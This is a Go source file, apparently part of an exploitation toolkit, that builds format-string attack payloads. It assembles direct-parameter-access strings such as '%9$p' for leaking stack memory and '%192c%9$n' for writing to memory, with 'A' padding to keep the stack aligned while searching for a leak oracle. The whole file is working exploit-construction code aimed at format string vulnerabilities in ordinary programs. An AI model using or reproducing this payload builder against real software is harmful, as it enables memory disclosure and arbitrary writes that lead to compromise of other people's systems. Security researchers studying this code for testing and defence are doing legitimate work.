package memory

import (
	"bytes"
	"fmt"
	"strconv"
)

type formatStringBuilder struct {
	returnDataDelim  []byte
	endOfStringDelim []byte
}

// The resulting string is going to look like this:
//     [padding][format-string-with-loop-index][address]
//
// The "padding" is required because of the format
// string parameter specifier. As it grows, it could
// potentially mess up the alignment of the stack,
// which will make finding the oracle very difficult.
func (o formatStringBuilder) buildDPA(paramNumber int, specifiers []byte, alignmentLen int) []byte {
	temp := bytes.NewBuffer(nil)
	o.appendDPALeak(paramNumber, specifiers, temp)
	return o.build(alignmentLen, temp)
}

// %192p|%9$n|
func (o formatStringBuilder) appendDPAWrite(numBytes int, paramNum int, specifiers []byte, buff *bytes.Buffer) {
	buff.WriteByte('%')
	buff.WriteString(strconv.Itoa(numBytes))
	buff.WriteByte('c')
	o.appendDPALeak(paramNum, specifiers, buff)
}

func (o formatStringBuilder) appendDPALeak(paramNumber int, specifiers []byte, buff *bytes.Buffer) {
	o.appendPrefix(buff)
	buff.WriteByte('%')
	buff.WriteString(strconv.Itoa(paramNumber))
	buff.WriteByte('$')
	if len(specifiers) > 0 {
		buff.Write(specifiers)
	}
	o.appendSuffix(buff)
}

func (o formatStringBuilder) appendPrefix(buff *bytes.Buffer) {
	buff.Write(o.returnDataDelim)
}

func (o formatStringBuilder) appendSuffix(buff *bytes.Buffer) {
	buff.Write(o.returnDataDelim)
	buff.Write(o.endOfStringDelim)
}

func (o formatStringBuilder) build(memAlignmentLen int, unalignedFmtStr *bytes.Buffer) []byte {
	return appendStringWithCharUntilLen(unalignedFmtStr.Bytes(), 'A', memAlignmentLen)
}

func (o formatStringBuilder) isSuitableForLeaking() error {
	if len(o.returnDataDelim) == 0 {
		return fmt.Errorf("prefix and suffix field cannot be empty")
	}
	return nil
}
